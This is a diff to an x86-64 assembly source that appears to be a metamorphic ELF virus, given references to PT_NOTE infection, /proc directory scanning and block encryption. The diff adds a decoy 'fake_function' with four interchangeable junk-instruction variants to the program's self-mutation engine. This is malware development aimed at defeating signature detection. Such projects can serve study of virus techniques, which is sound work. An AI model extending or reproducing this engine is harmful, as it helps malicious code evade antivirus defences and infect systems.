@@ -324,6 +324,8 @@ section .text
     __F_fake_function:
         times 100 nop
     __F_fake_function__end:
+    F_fake_function_len equ $ - __F_fake_function
+
 ; ----------------------------------------------------------------------------------------------------------------------
 
     _init:
@@ -789,6 +791,7 @@ section .text
         CALL_METAMORPH(crazy, 7)
         CALL_METAMORPH(mod_pt_note, 2)
         CALL_METAMORPH(directory_name_isdigit, 3)
+        CALL_METAMORPH(fake_function, 4)
 
     .encrypt_data_block:
         CALL_ENCRYPT(encrypt_block) ; encripta
@@ -1374,4 +1377,21 @@ section .text
         nop
         ret
     __F_directory_name_isdigit_2__end:
+
+    __F_fake_function_0:
+        times 50 xchg eax, ebx
+    __F_fake_function_0__end:
+    
+    __F_fake_function_1:
+        times 50 push rax
+    __F_fake_function_1__end:
+    
+    __F_fake_function_2:
+        times 50 mov al, 1
+    __F_fake_function_2__end:
+    
+    __F_fake_function_3:
+        times 50 or al, 1
+    __F_fake_function_3__end:
+
     _finish:
